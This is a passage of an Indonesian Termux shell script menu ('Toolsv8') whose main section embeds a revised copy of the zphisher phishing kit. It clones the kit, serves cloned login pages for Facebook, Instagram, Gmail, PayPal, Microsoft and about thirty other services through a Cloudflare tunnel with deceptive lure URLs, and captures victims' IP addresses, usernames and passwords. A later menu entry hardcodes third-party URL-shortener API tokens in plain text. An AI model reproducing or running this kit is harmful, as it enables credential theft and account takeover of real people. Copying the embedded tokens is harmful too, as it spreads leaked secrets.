Tôi xin lỗi vì vi phạm. Cảm ơn bạn."
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
     ;;
12)
    clear
     ;;
 *)
    clear 
    echo ""
    echo -e "${c} Pilihan Anda Tidak Valid..!!"
    sleep 3 
    clear 
  ;;
esac
        echo ""
              echo -e "${y}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
              ;;
       25)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
███████╗██╗   ██╗    ███████╗██╗██╗     ███████╗
██╔════╝██║   ██║    ██╔════╝██║██║     ██╔════╝
███████╗██║   ██║    █████╗  ██║██║     █████╗  
╚════██║╚██╗ ██╔╝    ██╔══╝  ██║██║     ██╔══╝  
███████║ ╚████╔╝     ██║     ██║███████╗███████╗
╚══════╝  ╚═══╝      ╚═╝     ╚═╝╚══════╝╚══════╝
" | lolcat 
echo ""
echo -e "${g}           Pilihan Metode Anda${n}"
echo "============================================"
echo -e "${r}  [ ${g}01${r} ]${y} Input link & simpan dengan curl"
echo -e "${r}  [ ${g}02${r} ]${y} Pindahkan file (mv) ke folder"
echo -e "${r}  [ ${g}03${r} ]${y} Salin file (cp) ke folder"
echo -e "${r}  [ ${g}04${r} ]${c} Keluar dari tools${n}"
echo "============================================"
echo -e "${g}"
read -p "Pilihan Anda (1/2/4) : " mode
case "$mode" in
  1|01)
    echo -e "${y}"
    read -p "Masukkan link file anda : " input_link
    echo -e "${c}"
    read -p "Masukkan nama file simpan [ contoh : script.py ] : " file
    echo ""
    echo -e "${c}Mengunduh dari ${r}: ${n}$input_link"
    echo -e "${c}Menyimpan ke ${r}: ${n}/sdcard/Download/$file"
    echo ""
    curl -L "$input_link" -o "/sdcard/Download/$file"
    echo ""
    echo -e "${g}Unduhan selesai [ jika tidak ada error ]"
    echo ""
    ;;
  2|02)
    echo -e "${y}"
    read -p "Masukkan nama file anda di mv HOME : " file
    if [[ ! -f "$HOME/$file" ]]; then
      echo ""
      echo -e "${r}Nama File Tidak Ditemukan...!!"
      echo ""
      exit
    fi
    mv "$HOME/$file" "/sdcard/Download/"
    echo ""
    echo -e "${c}File berhasil dipindahkan ke ${r}[ ${g}sdcard/Download${r} ]"
    echo ""
    ;;
  3|03)
    echo -e "${y}"
    read -p "Masukkan nama file anda di cp HOME : " file
    if [[ ! -f "$HOME/$file" ]]; then
      echo ""
      echo -e "${r}Nama File Tidak Ditemukan...!!"
      echo ""
    fi
    cp "$HOME/$file" "/sdcard/Download/"
    echo ""
    echo -e "${c}File berhasil disalin ke ${r}[ ${g}sdcard/Download${r} ]"
    echo ""
    ;;
  *)
    echo ""
    echo -e "${y} Pilihan Anda Tidak Valid...!!"
    echo ""
    ;;
esac
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
     ;;
         26)
                echo ""
                mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
                echo -e "${cyan} Anda Memilih Menu Hacking...!!"
                echo ""
                echo -e "${red} VIP UNLOCK...!!"
                sleep 2
                clear
                 cd
while true; do
    nexphisher="$PREFIX/opt/zphisher"
    if [ -d "$nexphisher" ]; then
        clear 
        echo ""
        echo "Membuka Tools Pshing All Sosmed..!!"
        sleep 5
        cd $nexphisher    
        __version__="5.0.1 ALPHA"
        RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
        MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
        REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
        MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
        RESETBG="$(printf '\e[0m\n')"      
        if [[ ! -d ".server" ]]; then
            mkdir -p ".server"
        fi     
        if [[ ! -d "auth" ]]; then
            mkdir -p "auth"
        fi   
        if [[ -d ".server/www" ]]; then
            rm -rf ".server/www"
            mkdir -p ".server/www"
        else
            mkdir -p ".server/www"
        fi    
        if [[ -e ".server/.loclx" ]]; then
            rm -rf ".server/.loclx"
        fi     
        if [[ -e ".server/.cld.log" ]]; then
            rm -rf ".server/.cld.log"
        fi      
        exit_on_signal_SIGINT() {
            {
                printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1
                reset_color
            }
        }
        exit_on_signal_SIGTERM() {
            {
                printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1
                reset_color
            }
        }      
        reset_color() {
            tput sgr0
            tput op
            return
        }    
        kill_pid() {
            check_PID="php ngrok cloudflared loclx"
            for process in ${check_PID}; do
                if [[ $(pidof ${process}) ]]; then
                    killall ${process} > /dev/null 2>&1
                fi
            done
        } 
        banner() {
            cat <<- EOF
${ORANGE}
${ORANGE} ______      _     _     _
${ORANGE}|___  /     | |   (_)   | |
${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __
${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |
${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|
${ORANGE}      | |
${ORANGE}      |_|                ${RED}Version : ${__version__}
${GREEN}[${WHITE}-${GREEN}]${CYAN} Tools Yang Di Kembangkan oleh [ Mr.Thonxyzz404 ]${WHITE}
EOF
        }      
        banner_small() {
            cat <<- EOF
${BLUE}
${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
EOF
        }       
        dependencies() {
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."          
            if [[ -d "/data/data/com.termux/files/home" ]]; then
                if [[ ! $(command -v proot) ]]; then
                    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
                    pkg install proot resolv-conf -y
                fi
                if [[ ! $(command -v tput) ]]; then
                    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
                    pkg install ncurses-utils -y
                fi
            fi           
            if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
            else
                pkgs=(php curl unzip)
                for pkg in "${pkgs[@]}"; do
                    type -p "$pkg" &> /dev/null || {
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                        if [[ $(command -v pkg) ]]; then
                            pkg install "$pkg" -y
                        elif [[ $(command -v apt) ]]; then
                            sudo apt install "$pkg" -y
                        elif [[ $(command -v apt-get) ]]; then
                            sudo apt-get install "$pkg" -y
                        elif [[ $(command -v pacman) ]]; then
                            sudo pacman -S "$pkg" --noconfirm
                        elif [[ $(command -v dnf) ]]; then
                            sudo dnf -y install "$pkg"
                        elif [[ $(command -v yum) ]]; then
                            sudo yum -y install "$pkg"
                        else
                            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                            {
                                reset_color
                                exit 1
                            }
                        fi
                    }
                done
                if [[ ! $(command -v cloudflared) ]]; then
                    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}cloudflared${CYAN}"${WHITE}
                    if [[ $(command -v pkg) ]]; then
                        pkg install cloudflared -y
                    elif [[ $(command -v apt) ]]; then
                        sudo apt install cloudflared -y
                    elif [[ $(command -v apt-get) ]]; then
                        sudo apt-get install cloudflared -y
                    elif [[ $(command -v pacman) ]]; then
                        sudo pacman -S cloudflared --noconfirm
                    elif [[ $(command -v dnf) ]]; then
                        sudo dnf -y install cloudflared
                    elif [[ $(command -v yum) ]]; then
                        sudo yum -y install cloudflared
                    else
                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Could not install cloudflared automatically"
                    fi
                fi
            fi
        }      
        msg_exit() {
            {
                clear
                banner
                echo
            }
            echo -e "${GREENBG}${BLACK}
Terima kasih telah menggunakan alat ini.
Semoga hari Anda menyenangkan.${RESETBG}\n"
            {
                reset_color
                sleep 5
            }
        }     
        about() {
            {
                clear
                banner
                echo
            }
            cat <<- EOF
${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
${GREEN} Revisi   ${RED}:  ${ORANGE} Mr.Thonxyzz404
${GREEN} Tiktok   ${RED}:  ${CYAN}https://@thonxyzz404
${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
${WHITE} ${REDBG}Peringatan:${RESETBG}
${CYAN}  Alat ini dibuat untuk tujuan pendidikan saja ${RED}!${WHITE}${CYAN}
Penulis tidak bertanggung jawab atas penyalahgunaan
Toolkit ini${RED}!${WHITE}
${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
KasRoudra, sepp0, ThelinuxChoice, Yisus7u7, Mr.Thonxyzz404
${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
EOF
            IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
            case $REPLY in
                99)
                    msg_exit
                    ;;
                0 | 00)
                    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
                    {
                        sleep 1
                        main_menu
                    }
                    ;;
                *)
                    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                    {
                        sleep 1
                        about
                    }
                    ;;
            esac
        }    
        HOST='127.0.0.1'
        PORT=$(shuf -i 1000-9999 -n 1)      
        cusport() {
            echo ""
            read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Apakah Anda Ingin Port Kustom? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
            if [[ ${P_ANS} =~ ^([yY])$ ]]; then
                printf "\n\n"
                read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE}Masukkan Port Kustom 4 Digit Anda 1024-9999 : ${WHITE}" CU_P
                if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
                    PORT=${CU_P}
                    echo ""
                else
                    echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
                    {
                        sleep 2
                        clear
                        banner
                        cusport
                    }
                fi
            elif [[ ${P_ANS} =~ ^([Nn])$ ]]; then
                echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port : $PORT...${WHITE}"
                echo ""
            else
                echo ""
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${WHITE}"
                cusport
            fi
        }
        setup_site() {
            echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Menyiapkan server..."${WHITE}
            cp -rf .sites/"$website"/* .server/www
            cp -f .sites/ip.php .server/www/
            echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Menjalankan server PHP..."${WHITE}
            cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
        }
        capture_ip() {
            IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
            IFS=$'\n'
            echo -e "\n${RED}┌───[${WHITE}+${RED}]${GREEN} Alamat IP Terdeteksi!"
            echo -e "${RED}│"
            printf "${RED}├───[${WHITE}•${RED}]${GREEN} Alamat IP     : ${BLUE}%-20s\n" "$IP"
            echo -e "${RED}├───[${WHITE}•${RED}]${GREEN} Disimpan di   : ${ORANGE}auth/ip.txt"
            echo -e "${RED}└──────────────────────────────────────────────"
            cat .server/www/ip.txt >> auth/ip.txt
        }
        capture_creds() {
            ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
            PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
            IFS=$'\n'
            echo -e "\n${RED}┌───[${WHITE}+${RED}]${GREEN} Kredensial Ditemukan!"
            echo -e "${RED}│"
            printf "${RED}├───[${WHITE}•${RED}]${GREEN} Username      : ${BLUE}%-20s\n" "$ACCOUNT"
            printf "${RED}├───[${WHITE}•${RED}]${GREEN} Password      : ${BLUE}%-20s\n" "$PASSWORD"
            echo -e "${RED}├───[${WHITE}•${RED}]${GREEN} Disimpan di   : ${ORANGE}auth/usernames.dat"
            echo -e "${RED}└──────────────────────────────────────────────"
            cat .server/www/usernames.txt >> auth/usernames.dat
            echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Menunggu login berikutnya, tekan ${BLUE}q lalu enter ${ORANGE}untuk berhenti...\n"
        }
        capture_data() {
            banner
            echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Pemantauan aktivitas login...\n"
            echo -ne "${BLUE}(Ketik q lalu Enter kapan saja untuk keluar)\n\n"
            while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                    echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} IP baru terdeteksi!"
                    capture_ip
                    rm -rf .server/www/ip.txt
                fi
                if [[ -e ".server/www/usernames.txt" ]]; then
                    echo -e "\n${RED}[${WHITE}!${RED}]${GREEN} Kredensial diterima!"
                    capture_creds
                    rm -rf .server/www/usernames.txt
                fi
                read -t 1 input
                [[ $input == "q" ]] && break
                sleep 0.5
            done
        } 
        start_cloudflared() {
            rm -f .cld.log > /dev/null 2>&1
            cusport
            echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
            {
                sleep 1
                setup_site
            }
            echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared...\n\n"
            echo -ne "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting Cloudflared...\e[0m\n"
            php -S localhost:$PORT > /dev/null 2>&1 &
            sleep 3
            cloudflared tunnel --url http://localhost:$PORT --protocol http2 > sendlink 2>&1 &
            sleep 8
            send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
            {
                clear
                banner_small
            }
            CUTTLY_API_KEY=""
            shortlink() {
                local LONG_URL="$1"
                if [ -z "$LONG_URL" ]; then
                    echo "❌ Usage: shortlink \"url\""
                    return 1
                fi
                echo "$LONG_URL"
            }
            cldflr_link="$send_link"
            cldflr_link1=${cldflr_link#https://}
            short_send_link=$(shortlink "$cldflr_link")
            echo -e "\n\n${GREEN}Silahkan Anda Copy Karena Setelah Enter Url Akan Hilang${RED}!"
            echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
            echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1${BLUE}"
            echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${GREEN}$short_send_link${BLUE}"
            IFS= read -r -e -p "Silahkan Enter Jika Sudah Copy URL: "
            clear
            capture_data
        }
        tunnel_menu() {
            {
                clear
                banner_small
            }
            start_cloudflared
        }
        site_facebook() {
            cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Tradisional
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Voting Canggih
${RED}[${WHITE}03${RED}]${ORANGE} Halaman Login Keamanan Palsu
${RED}[${WHITE}04${RED}]${ORANGE} Halaman Login Messenger Facebook
EOF
            IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
            case $REPLY in
                1 | 01)
                    website="facebook"
                    mask='https://m.facebook.com'
                    tunnel_menu
                    ;;
                2 | 02)
                    website="fb_advanced"
                    mask='http://vote-for-the-best-social-media'
                    tunnel_menu
                    ;;
                3 | 03)
                    website="fb_security"
                    mask='http://make-your-facebook-secured-and-free-from-hackers'
                    tunnel_menu
                    ;;
                4 | 04)
                    website="fb_messenger"
                    mask='http://get-messenger-premium-features-free'
                    tunnel_menu
                    ;;
                *)
                    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
                    {
                        sleep 1
                        clear
                        banner_small
                        site_facebook
                    }
                    ;;
            esac
        }
        site_instagram() {
            cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Tradisional
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Auto Followers
${RED}[${WHITE}03${RED}]${ORANGE} Halaman Login 1000 Followers
${RED}[${WHITE}04${RED}]${ORANGE} Halaman Login Verifikasi Lencana Biru
EOF
            IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
            case $REPLY in
                1 | 01)
                    website="instagram"
                    mask='http://get-unlimited-followers-for-instagram'
                    tunnel_menu
                    ;;
                2 | 02)
                    website="ig_followers"
                    mask='http://get-unlimited-followers-for-instagram'
                    tunnel_menu
                    ;;
                3 | 03)
                    website="insta_followers"
                    mask='http://get-1000-followers-for-instagram'
                    tunnel_menu
                    ;;
                4 | 04)
                    website="ig_verify"
                    mask='http://blue-badge-verify-for-instagram-free'
                    tunnel_menu
                    ;;
                *)
                    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
                    {
                        sleep 1
                        clear
                        banner_small
                        site_instagram
                    }
                    ;;
            esac
        }
        site_gmail() {
            cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Gmail Lama
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Gmail Baru
${RED}[${WHITE}03${RED}]${ORANGE} Halaman Voting Canggih
EOF
            IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
            case $REPLY in
                1 | 01)
                    website="google"
                    mask='http://get-unlimited-google-drive-free'
                    tunnel_menu
                    ;;
                2 | 02)
                    website="google_new"
                    mask='http://get-unlimited-google-drive-free'
                    tunnel_menu
                    ;;
                3 | 03)
                    website="google_poll"
                    mask='http://vote-for-the-best-social-media'
                    tunnel_menu
                    ;;
                *)
                    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
                    {
                        sleep 1
                        clear
                        banner_small
                        site_gmail
                    }
                    ;;
            esac
        }
        site_vk() {
            cat <<- EOF
${RED}[${WHITE}01${RED}]${ORANGE} Halaman Login Tradisional
${RED}[${WHITE}02${RED}]${ORANGE} Halaman Login Voting Canggih
EOF
            IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih salah satu opsi : ${BLUE}"
            case $REPLY in
                1 | 01)
                    website="vk"
                    mask='http://vk-premium-real-method-2020'
                    tunnel_menu
                    ;;
                2 | 02)
                    website="vk_poll"
                    mask='http://vote-for-the-best-social-media'
                    tunnel_menu
                    ;;
                *)
                    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi tidak valid, silakan coba lagi..."
                    {
                        sleep 1
                        clear
                        banner_small
                        site_vk
                    }
                    ;;
            esac
        }
        main_menu() {
            {
                clear
                banner
                echo
            }
            cat <<- EOF
${RED}[${WHITE}::${RED}]${ORANGE} Pilih Serangan Untuk Korban Anda ${RED}[${WHITE}::${RED}]${ORANGE}
${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
${RED}[${WHITE}34${RED}]${ORANGE} Discord
${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
EOF
            IFS= read -r -e -p "${RED}[${WHITE}-${RED}]${GREEN} Pilih opsi : ${BLUE}"
            case $REPLY in
                1 | 01)
                    site_facebook
                    ;;
                2 | 02)
                    site_instagram
                    ;;
                3 | 03)
                    site_gmail
                    ;;
                4 | 04)
                    website="microsoft"
                    mask='https://www.microsoft.com'
                    tunnel_menu
                    ;;
                5 | 05)
                    website="netflix"
                    mask='https://www.netflix.com'
                    tunnel_menu
                    ;;
                6 | 06)
                    website="paypal"
                    mask='https://www.paypal.com'
                    tunnel_menu
                    ;;
                7 | 07)
                    website="steam"
                    mask='https://store.steampowered.com'
                    tunnel_menu
                    ;;
                8 | 08)
                    website="twitter"
                    mask='https://twitter.com'
                    tunnel_menu
                    ;;
                9 | 09)
                    website="playstation"
                    mask='https://www.playstation.com'
                    tunnel_menu
                    ;;
                10)
                    website="tiktok"
                    mask='https://www.tiktok.com'
                    tunnel_menu
                    ;;
                11)
                    website="twitch"
                    mask='https://www.twitch.tv'
                    tunnel_menu
                    ;;
                12)
                    website="pinterest"
                    mask='https://www.pinterest.com'
                    tunnel_menu
                    ;;
                13)
                    website="snapchat"
                    mask='https://www.snapchat.com'
                    tunnel_menu
                    ;;
                14)
                    website="linkedin"
                    mask='https://www.linkedin.com'
                    tunnel_menu
                    ;;
                15)
                    website="ebay"
                    mask='https://www.ebay.com'
                    tunnel_menu
                    ;;
                16)
                    website="quora"
                    mask='https://www.quora.com'
                    tunnel_menu
                    ;;
                17)
                    website="protonmail"
                    mask='https://mail.proton.me'
                    tunnel_menu
                    ;;
                18)
                    website="spotify"
                    mask='https://www.spotify.com'
                    tunnel_menu
                    ;;
                19)
                    website="reddit"
                    mask='https://www.reddit.com'
                    tunnel_menu
                    ;;
                20)
                    website="adobe"
                    mask='https://www.adobe.com'
                    tunnel_menu
                    ;;
                21)
                    website="deviantart"
                    mask='https://www.deviantart.com'
                    tunnel_menu
                    ;;
                22)
                    website="badoo"
                    mask='https://badoo.com'
                    tunnel_menu
                    ;;
                23)
                    website="origin"
                    mask='https://www.origin.com'
                    tunnel_menu
                    ;;
                24)
                    website="dropbox"
                    mask='https://www.dropbox.com'
                    tunnel_menu
                    ;;
                25)
                    website="yahoo"
                    mask='https://mail.yahoo.com'
                    tunnel_menu
                    ;;
                26)
                    website="wordpress"
                    mask='https://wordpress.com'
                    tunnel_menu
                    ;;
                27)
                    website="yandex"
                    mask='https://mail.yandex.com'
                    tunnel_menu
                    ;;
                28)
                    website="stackoverflow"
                    mask='https://stackoverflow.com'
                    tunnel_menu
                    ;;
                29)
                    site_vk
                    ;;
                30)
                    website="xbox"
                    mask='https://www.xbox.com'
                    tunnel_menu
                    ;;
                31)
                    website="mediafire"
                    mask='https://www.mediafire.com'
                    tunnel_menu
                    ;;
                32)
                    website="gitlab"
                    mask='https://gitlab.com'
                    tunnel_menu
                    ;;
                33)
                    website="github"
                    mask='https://github.com'
                    tunnel_menu
                    ;;
                34)
                    website="discord"
                    mask='https://discord.com'
                    tunnel_menu
                    ;;
                99)
                    about
                    ;;
                0 | 00)
                    msg_exit
                    ;;
                *)
                    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opsi Tidak Valid, Coba Lagi..."
                    {
                        sleep 1
                        main_menu
                    }
                    ;;
            esac
        }
        kill_pid
        dependencies
        main_menu
        break
    else
        clear 
        echo ""
        echo "Menginstall package"
        echo ""
        cd $PREFIX
        mkdir -p opt
        cd opt
        pkg install -y tur-repo
        git clone --depth=32 https://github.com/Blackheat023/zphisher
    fi
done
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      27)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'
clear 
echo "
⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣ 
" | lolcat 
echo -e "${c}"
read -p "Silahkan Masukkan Url / Link : " LONG_URL
echo ""
BITLY_TOKEN="b39549e89f08923d7faef0b53e65d77cff589410"
TINYURL_TOKEN="RbcrFbz7N6T67JdGeUVBMbrYylHDQYXyyrDK4mMefuYp0mHccX9gFX7WEEHw"
CUTTLY_API_KEY="81eb1f7c58a3542ad2132cb05b1dfa55cd00a"
echo ""
echo -e "${g}Memendekkan URL ${r}: $LONG_URL"
echo ""
echo -e "${r}[ ${g}01 ${r}]${n} Bitly"
bitly_response=$(curl -s -X POST "https://api-ssl.bitly.com/v4/shorten" \
  -H "Authorization: Bearer $BITLY_TOKEN" \
  -H "Content-Type: application/json" \
